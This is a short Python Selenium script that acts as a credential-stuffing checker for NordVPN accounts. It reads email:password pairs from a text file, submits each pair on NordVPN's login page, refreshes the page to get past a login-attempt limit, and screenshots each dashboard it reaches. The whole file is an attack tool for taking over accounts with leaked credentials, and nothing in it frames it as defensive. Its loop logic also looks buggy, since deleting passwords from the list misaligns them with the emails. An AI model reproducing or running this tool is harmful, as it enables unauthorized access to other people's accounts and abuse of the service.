from selenium import webdriver
from time import sleep
import re

account = open('Nordvpn Accounts.txt', 'r') #opens the NordVpn accounts
Accounts = account.read()
pattern = r'[\w\.-]+@[\w\.-]+\.[\w\.]+'
pattern2 = r':(\S+)'

email_match = re.findall(pattern, Accounts)  # Extracts all the emails from the text file and puts them in a list
password_match = re.findall(pattern2, Accounts)  # Extracts all the passwords from the text file and puts them in a list

driver = webdriver.Firefox()  # opens the Firefox webdriver
driver.get('https://ucp.nordvpn.com/login/')  # open the Nordvpn login site
sleep(25)

for i in range(len(email_match)) :
    if i == 20 : #every 20 passwords it won't let you login so i refresh
        driver.refresh()
    driver.find_element_by_xpath('//*[@id="ucp_login_email_field"]').send_keys(email_match[i])  # Enters the email
    driver.find_element_by_xpath('//*[@id="ucp_login_password_field"]').send_keys(password_match[i])  # enters the password
    driver.find_element_by_xpath('/html/body/div[1]/div/div[2]/div/div/div/form/div/button').click()  # clicks the login button
    print(i)
    sleep(8)
    if driver.current_url == 'https://ucp.nordvpn.com/dashboard/' :  # checks if the login is true
        sleep(2)
        driver.save_screenshot(str(i) + ' .png')  # saves a screen shot of the username
        driver.find_element_by_xpath('/html/body/div[1]/div/div[1]/div/div/div/div[2]/div/a').click()
        sleep(8)
    else :
        driver.find_element_by_xpath('//*[@id="ucp_login_email_field"]').clear()  # clears the email for another try
        driver.find_element_by_xpath('//*[@id="ucp_login_password_field"]').clear()  # clears the password for another try
        del password_match[:i]
account.close()